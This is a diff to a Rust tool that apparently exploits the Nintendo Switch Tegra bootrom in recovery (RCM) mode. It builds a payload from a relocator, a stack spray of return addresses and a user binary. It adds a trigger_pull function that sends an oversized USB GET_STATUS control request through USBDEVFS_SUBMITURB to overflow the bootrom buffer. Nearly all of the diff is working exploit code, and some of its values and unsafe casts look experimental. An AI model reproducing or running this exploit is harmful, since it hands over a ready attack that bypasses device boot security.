@@ -200,25 +200,6 @@ impl SwitchRCM{
         }
         Err(UsbError::WriteError)
     }
-    //just testing ioctl commands
-    pub fn _get_connect_info(&self) -> Result<ConnectInfo,UsbError>{
-        let fd = self.file_descriptor;
-        let connect_info = &ConnectInfo{
-                                dev_num:0, 
-                                slow : 0,
-        };
-        unsafe{
-            let info_pointer = std::mem::transmute::<&ConnectInfo, *const c_void>(connect_info);
-            let ioctl_ret = ioctl(fd,_USBDEVFS_CONNECTINFO,info_pointer);
-            let connect_info = std::mem::transmute::<*const c_void, &ConnectInfo>(info_pointer);
-            if ioctl_ret >-1{
-                return Ok(*connect_info);
-            }
-        }
-
-        Err(UsbError::ClaimingInterfaceFailed)
-    } 
-
     pub fn read_device_id(&self)-> Result<&[u8;16],UsbError>{
     
         let device_id = CString::new("0000000000000000").expect("failed");
@@ -247,10 +228,10 @@ impl SwitchRCM{
     }
     pub fn generate_payload(&self,user_payload:&Path)-> Result<Vec<u8>,UsbError>{
         const PAYLOAD_LENGTH:u32 = 0x30298;
-        const PAYLOAD_START_ADDRESS:u32 = 0x40010E40;
+        const _PAYLOAD_START_ADDRESS:u32 = 0x40010E40;
         const RCM_PAYLOAD_ADDRESS:u32 =	0x40010000;
-        const STACK_SPRAY_START:u32   = 0x40014E40;
-        const STACK_SPRAY_END:u32     = 0x40017000;
+        const _STACK_SPRAY_START:u32   = 0x40014E40;
+        const _STACK_SPRAY_END:u32     = 0x40017000;
 
         let mut payload:Vec<u8> = Vec::new();
         
@@ -262,6 +243,19 @@ impl SwitchRCM{
             let mut padding:Vec<u8> = vec![0;676];
             payload.append(&mut padding);
         }
+
+        // spray stack
+        {
+            let count = (0x4001F000-RCM_PAYLOAD_ADDRESS)/4;
+            let address:u32 = 0x4001F000;
+            let payload_address_le = address.to_le_bytes();
+            for _times in 0..count{
+                payload.push(payload_address_le[0]);
+                payload.push(payload_address_le[1]);
+                payload.push(payload_address_le[2]);
+                payload.push(payload_address_le[3]);
+            }
+        }
         //get relocator
         let relocator_path = Path::new("./intermezzo.bin");
         let mut relocator = match std::fs::read(relocator_path){
@@ -271,45 +265,18 @@ impl SwitchRCM{
         //let relocator_size = relocator.len();
         //add relocator to payload
         payload.append(&mut relocator);
-        
-        //pad again until userpayload
+        //pad 
         {
-            let size_to_pad:usize = 3772;
+            let size_to_pad:usize = 0x40020000 - (0x4001F000+92);
             let mut padding:Vec<u8> = vec![0;size_to_pad];
             payload.append(&mut padding);
         }
         //get user payload
-        let user_paylaod = match std::fs::read(user_payload){
+        let mut u_payload = match std::fs::read(user_payload){
             Ok(bytes)       => bytes,
             Err(_)          => return Err(UsbError::UserPayloadNotFound),
         };
-        //add part of payload till stack spray start
-        let mut user_index = 0;
-        {
-            let pad_size = STACK_SPRAY_START - PAYLOAD_START_ADDRESS;
-            for (index,byte) in user_paylaod.iter().enumerate(){
-                user_index = index;
-                if index == pad_size as usize{
-                    break; 
-                }
-                payload.push(*byte);
-            }
-        }
-        // spray stack
-        {
-            let count = (STACK_SPRAY_END -STACK_SPRAY_START)/4;
-            let payload_address_le = RCM_PAYLOAD_ADDRESS.to_le_bytes();
-            for _times in 0..count{
-                payload.push(payload_address_le[0]);
-                payload.push(payload_address_le[1]);
-                payload.push(payload_address_le[2]);
-                payload.push(payload_address_le[3]);
-            }
-        }
-        //add rest of payload
-        for byte in &user_paylaod[user_index..]{
-            payload.push(*byte);
-        }
+        payload.append(&mut u_payload);
         //get lenght of payload and see if it is divisible by 0x1000
         //pad till is it
         {
@@ -320,6 +287,7 @@ impl SwitchRCM{
             }
         }
         //check payload length 
+        println!("max size = {}, payload size :{}",PAYLOAD_LENGTH,payload.len());
         if payload.len() > PAYLOAD_LENGTH as usize{
             return Err(UsbError::PayloadTooLarge);
         }
@@ -363,14 +331,56 @@ impl SwitchRCM{
             };
             bytes_written +=ret_val;
         }
+        println!("Write count:{}",write_count);
         Ok(bytes_written)
     }
 
-    pub fn _trigger_pull(){
-
+    pub fn trigger_pull(&self) -> Result<c_int,UsbError>{
+        let fd = self.file_descriptor;
+        //let data:&[u8;0x7000] = &[0;0x7000];
+        //let data_ptr: *const c_void = unsafe{std::mem::transmute(data)};
+        let request = &ControlRequest{
+            request_type: 130,       //USB_DIR_IN | USB_RECIP_ENDPOINT
+            request     :   0,       //USB_REQ_GET_STATUS
+            value       :   0,
+            index       :   0,
+            length      :   0x0070, //payload length
+        };
+        let request_ptr:*const c_void = unsafe{std::mem::transmute(request)};
+    
+        let context:&u32 = &0;
+        let context_ptr:*const c_void = unsafe{std::mem::transmute(context)};
+        let iso = iso_frame{
+            length:37108932,
+            actual_length:32765,
+            status:1501646240,
+        };
+        let urb = &URB{
+            request_type : 2,             //USBDEVFS_TYPE_CONTROL
+            endpoint     : 0,        
+            status       : 0,
+            flags        : 0,
+            buffer       : request_ptr,       //required
+            buffer_length: 0x7000+8,               //required
+            actual_length: 0,
+            start_frame  : 0,
+            union        :[0;4],
+            error_count  : 0,
+            signal_error : 0,
+            user_context : context_ptr,
+            iso_packet   : &iso,
+        };
+        
+        let urb:*const c_void = unsafe{std::mem::transmute(urb)};
+        //send request
+        unsafe{
+            let return_value = ioctl(fd,USBDEVFS_SUBMITURB,urb);
+            if return_value <0{
+                return Err(UsbError::SubmitError);
+            }
+            return Ok(return_value);
+        }
     }
-
-
 }
 #[derive(Debug)]
 pub enum UsbError{
@@ -386,6 +396,7 @@ pub enum UsbError{
     RelocatorNotFound,
     UserPayloadNotFound,
     WriteError,
+    SubmitError,
 }
 
 extern "C"{
@@ -403,8 +414,12 @@ const O_RDWR: c_int = 02;
 //probably will only work on x86_64 systems
 pub const USBDEVFS_CLAIMINTERFACE:u32 = 2147767567;
 pub const _USBDEVFS_CONNECTINFO:u32 = 1074287889;
-pub const _USBDEVFS_SUBMITURB:u32 = 2151175434;
+pub const USBDEVFS_SUBMITURB:u32 = 2151175434;
 pub const USBDEVFS_BULK:u32 = 3222820098; //3222820098
+pub const _USBDEVFS_CONTROL:u32 = 3222820096;
+pub const _USBDEVFS_URB_TYPE_CONTROL:u32 = 2;
+pub const _USBDEVFS_DISCARDURB:u32 = 21771;
+pub const _USBDEVFS_REAPURB:u32 =1074287884;
 pub const USB_DIR_IN:c_int = 128;
 pub const USB_DIR_OUT:c_int = 0;
 
@@ -423,7 +438,73 @@ struct BulkTransfer{
     data     : *const c_void,
 }
 
+#[repr(C)]
+struct ControlRequest{
+    request_type:   u8,
+    request     :   u8,
+    value       :   u16,
+    index       :   u16,
+    length      :   u16,
+}
 
+#[repr(C)]
+struct _ControlTransfer{
+    request_type:   u8,
+    request     :   u8,
+    value       :   u16,
+    index       :   u16,
+    length      :   u16,
+    data        :   *const c_void,
+}
+
+//56 bytes total
+#[repr(C)]
+struct URB{
+    request_type : c_uchar,             //required
+    endpoint     : c_uchar,             //required
+    status       : c_int,
+    flags        : c_uint,
+    buffer       : *const std::ffi::c_void,       //required
+    buffer_length: c_int,               //required
+    actual_length: c_int,
+    start_frame  : c_int,
+    union        :[u8;4],
+    error_count  : c_int,
+    signal_error : c_uint,
+    user_context : *const std::ffi::c_void,
+    iso_packet   : *const iso_frame,
+}
+
+#[repr(C)]
+struct iso_frame{
+    length : c_uint,
+    actual_length: c_uint,
+    status : c_uint,
+}
+/*
+
+struct usbdevfs_urb {
+        unsigned char type;
+        unsigned char endpoint;
+        int status;
+        unsigned int flags;
+        void *buffer;
+        int buffer_length;
+        int actual_length;
+        int start_frame;
+        union {
+               	int number_of_packets;  /* Only used for isoc urbs */
+                unsigned int stream_id; /* Only used with bulk streams */
+        };
+	int error_count;
+        unsigned int signr;     /* signal to be sent on completion,
+                                  or 0 if none should be sent. */
+        void *usercontext;
+        struct usbdevfs_iso_packet_desc iso_frame_desc[0];
+};
+
+
+*/
 /*
 pub fn errno()->Errno{
     let err:i32 = 0;
